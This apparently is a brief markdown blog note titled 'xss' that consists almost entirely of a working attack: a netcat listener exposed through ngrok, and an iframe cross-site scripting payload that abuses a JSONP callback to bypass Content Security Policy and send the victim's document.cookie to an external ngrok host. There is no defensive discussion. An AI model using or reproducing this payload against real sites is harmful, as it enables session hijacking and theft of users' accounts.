---
layout: post
title: "xss"
keywords: "xss, iframe, cookie"
---
#### Bypass CSP and steal cookie using iframe


```
# Listener
nc -klnvp 9000
ngrok http 9000

# XSS
<iframe src="http://localhost:1337/list?callback=window.parent.location.href%3D`http://4ea69d0ff8e3.ngrok.io?c=%24%7Bdocument.cookie%7D`;display"></iframe>
```